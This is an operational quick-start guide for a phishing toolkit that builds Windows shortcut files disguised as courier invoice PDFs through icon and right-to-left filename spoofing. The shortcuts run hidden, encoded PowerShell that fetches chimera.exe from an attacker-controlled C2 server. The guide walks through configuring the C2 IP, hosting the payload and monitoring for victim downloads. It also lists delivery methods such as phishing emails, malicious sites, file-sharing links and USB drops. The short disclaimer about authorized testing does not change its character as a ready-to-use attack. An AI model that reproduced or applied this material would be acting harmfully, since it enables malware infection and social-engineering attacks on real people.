# QUICK START - LNK SPOOFING EXECUTION GUIDE

## 🚀 STEP 1: Generate LNK Files (2 minutes)

### Prerequisites Check
```powershell
# Open PowerShell in the Deliver Specialist folder
cd "d:\CyberY3T1\Deliver Specialist"

# Verify Python is installed
python --version

# Install pywin32 if needed
pip install pywin32
```

### Generate LNK Spoofing Files
```powershell
# Run the generator script
python lnk_generator.py
```

### What You'll See
```
============================================================
LNK SPOOFING GENERATOR - DHL/FedEx/UPS PHISHING
============================================================
[*] C2 Server: http://192.168.56.101:80/chimera.exe
[*] Output Directory: d:\CyberY3T1\Deliver Specialist\example_payloads

[*] Generating PowerShell payload...
    [✓] Payload encoded (length: 1024 chars)

[*] Creating LNK files...
[*] Variant 1: Classic LNK (PDF Icon)
    [✓] Created: example_payloads/Invoice_1128.pdf.lnk
[*] Variant 2: RTLO Spoofing (appears as .pdf)
    [✓] Created: example_payloads/Invoice_1128‮fdp.lnk
[*] Variant 4: Multiple Format Variations
    [✓] Created: example_payloads/DHL_Invoice_1128.pdf.lnk
    [✓] Created: example_payloads/Payment_Confirmation.pdf.lnk
    [✓] Created: example_payloads/Customs_Declaration.pdf.lnk
    ...

============================================================
✓ LNK SPOOFING FILES GENERATED SUCCESSFULLY
============================================================
```

---

## ✅ STEP 2: Verify Generated Files (1 minute)

### Check Files Exist
```powershell
# List all generated LNK files
dir "d:\CyberY3T1\Deliver Specialist\example_payloads\*.lnk"

# Output should show:
# Invoice_1128.pdf.lnk
# Invoice_1128‮fdp.lnk
# DHL_Invoice_1128.pdf.lnk
# Payment_Confirmation.pdf.lnk
# etc...
```

### Verify LNK Properties (Without Executing)
```powershell
# Use the verification tool
python verify_lnk.py

# This will analyze all LNK files and show:
# ✓ Target path
# ✓ Arguments
# ✓ Icon location
# ✓ Decoded PowerShell command
# ✓ Spoofing indicators
```

### Manual Verification
```powershell
# Right-click any .lnk file
# Click "Properties"
# Go to "Shortcut" tab
# Verify:
#   - Target: powershell.exe -NoProfile -WindowStyle Hidden...
#   - Icon: shell32.dll,3 (PDF)
#   - Working directory: %TEMP%
```

---

## 🔧 STEP 3: Setup C2 Server

### Option A: Linux/Kali (Recommended)
```bash
# On your Kali machine:
cd /tmp

# Copy chimera.exe here
# Then start server:
sudo python3 -m http.server 80

# You'll see output like:
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
```

### Option B: Windows Machine
```powershell
# On Windows C2 server:
cd C:\payloads

# Copy chimera.exe here
# Then start server (as Administrator):
python -m http.server 80

# You'll see:
# Serving HTTP on port 80
```

### Option C: Local Testing (Safe)
```powershell
# For testing on same machine:
cd "d:\CyberY3T1\Deliver Specialist"

# Start local server:
python -m http.server 8000

# Update lnk_generator.py:
# C2_IP = "localhost"
# C2_PORT = 8000
```

---

## 📋 STEP 4: Update C2 IP in Generator

### Edit lnk_generator.py
```powershell
# Open the file in a text editor:
notepad lnk_generator.py

# Find this line:
C2_IP = "192.168.56.101"  # CHANGE THIS TO YOUR ATTACKER IP

# Change it to your actual attacker machine IP:
C2_IP = "YOUR_KALI_IP_HERE"  # e.g., "192.168.1.100" or "10.0.0.5"
```

### Re-generate LNK Files
```powershell
# Run the generator again with updated IP
python lnk_generator.py

# New LNK files will have the correct C2 IP embedded
```

---

## 🧪 STEP 5: Test Locally (Controlled Environment)

### Test 1: File Properties
```powershell
# Right-click Invoice_1128.pdf.lnk
# Properties → Shortcut tab
# ✓ Verify Target shows powershell.exe
# ✓ Verify Icon shows PDF
# ✓ Verify Working Directory is %TEMP%
# DO NOT CLICK!
```

### Test 2: Command Verification
```powershell
# Read LNK properties programmatically:
$shell = New-Object -COM WScript.Shell
$lnk = $shell.CreateShortCut("example_payloads\Invoice_1128.pdf.lnk")
$lnk.TargetPath
$lnk.Arguments  # Should show -EncodedCommand with base64
$lnk.IconLocation
```

### Test 3: Dry Run (No Actual Execution)
```powershell
# Check what WOULD be downloaded:
# Look in $lnk.Arguments for the C2 URL
# Should be: http://YOUR_IP:PORT/chimera.exe
```

---

## 🎯 STEP 6: Real-World Delivery Methods

### Method 1: Email Attachment Phishing
```
1. Compose email in Outlook/Gmail
2. Subject: "Your DHL Invoice - Payment Required"
3. Attach: Invoice_1128.pdf.lnk (or any variant)
4. Send to target
5. When they click → malware downloads
```

### Method 2: Malicious Website Download
```
1. Host phishing website
2. Place LNK files on website
3. User downloads from website
4. Browser shows PDF icon in downloads
5. User clicks → execution
```

### Method 3: File Sharing Services
```
1. Upload LNK to Google Drive/OneDrive
2. Share link: "Download your invoice"
3. User downloads
4. User clicks
5. Execution
```

### Method 4: USB Distribution
```
1. Copy LNK files to USB
2. Label: "IMPORTANT - INVOICES"
3. Leave in office/parking lot
4. Employee plugs in and opens
5. Clicks LNK file
6. Execution
```

---

## 📊 STEP 7: Monitor C2 Server for Connections

### On Your C2 Server (Kali/Linux):
```bash
# Terminal 1: Start HTTP server
cd /tmp
sudo python3 -m http.server 80

# Terminal 2: Monitor access logs
tail -f access.log

# Expected output when victim clicks LNK:
# "192.168.1.100 - - [05/Dec/2025 10:15:32] GET /chimera.exe HTTP/1.1" 200
#
# This means:
# ✓ Victim machine: 192.168.1.100
# ✓ Downloaded file: chimera.exe
# ✓ Success code: 200
```

### Signs of Successful Exploitation:
```
1. HTTP log shows GET /chimera.exe with 200 status
2. Download bytes transferred matches chimera.exe size
3. (Depending on payload) victim machine now infected
```

---

## 🔍 STEP 8: Troubleshooting

### Problem: "No LNK files generated"
**Solution:**
```powershell
# Check if pywin32 is properly installed:
python -c "import win32com.client"

# If error, reinstall:
pip uninstall pywin32
pip install pywin32
python -m pip install --upgrade pywin32
```

### Problem: "Icon shows generic file icon, not PDF"
**Solution:**
```powershell
# icon must be shell32.dll,3
# Verify in lnk_generator.py:
self.create_lnk(
    "powershell.exe",
    args,
    "shell32.dll,3",  # ← Make sure this is correct
    filename
)
```

### Problem: "C2 server not receiving connections"
**Checklist:**
```
✓ C2 IP updated in lnk_generator.py?
✓ HTTP server running on C2 machine?
✓ Port 80 is open/not blocked?
✓ chimera.exe is in server directory?
✓ LNK files regenerated after IP change?
✓ Target machine can reach C2 machine?
```

### Problem: "PowerShell execution blocked"
**Solution:**
```powershell
# The script already includes -ExecutionPolicy Bypass
# But if still blocked, check Group Policy:
gpresult /h C:\gp_report.html
```

---

## 📝 CHECKLIST - Before Deployment

- [ ] Python installed
- [ ] pywin32 installed and registered
- [ ] C2 IP updated in lnk_generator.py
- [ ] LNK files generated in example_payloads/
- [ ] Verified LNK files exist and have correct properties
- [ ] C2 server setup and tested
- [ ] chimera.exe placed on C2 server
- [ ] HTTP server running on C2
- [ ] Can connect to C2 from test machine: `curl http://C2_IP/chimera.exe`
- [ ] Social engineering scenario planned
- [ ] Delivery method chosen (email/website/etc)
- [ ] Test environment isolated (NOT production)
- [ ] All testing completed and verified
- [ ] Rules of Engagement reviewed and approved

---

## ⚡ QUICK COMMAND REFERENCE

```powershell
# Generate files
python lnk_generator.py

# Verify all files
python verify_lnk.py

# Verify specific file
python verify_lnk.py "example_payloads\Invoice_1128.pdf.lnk"

# List all LNK files
dir example_payloads\*.lnk

# Check file properties
$shell = New-Object -COM WScript.Shell
$lnk = $shell.CreateShortCut("example_payloads\Invoice_1128.pdf.lnk")
$lnk.TargetPath
$lnk.Arguments
```

---

## ⚠️ IMPORTANT REMINDERS

🚨 **Legal Disclaimer:**
- Only use in authorized penetration testing
- Obtain written permission from system owner
- Use in isolated, test environments only
- Unauthorized access is ILLEGAL
- Follow all applicable laws and regulations

---

## ✨ You're Ready!

Your LNK spoofing setup is complete. The files in `example_payloads/` are ready to be:
- Embedded in phishing emails
- Hosted on malicious websites
- Shared via file services
- Distributed via USB
- Used in social engineering campaigns

**Remember:** Always maintain ethical and legal boundaries. Use only in authorized red team exercises.
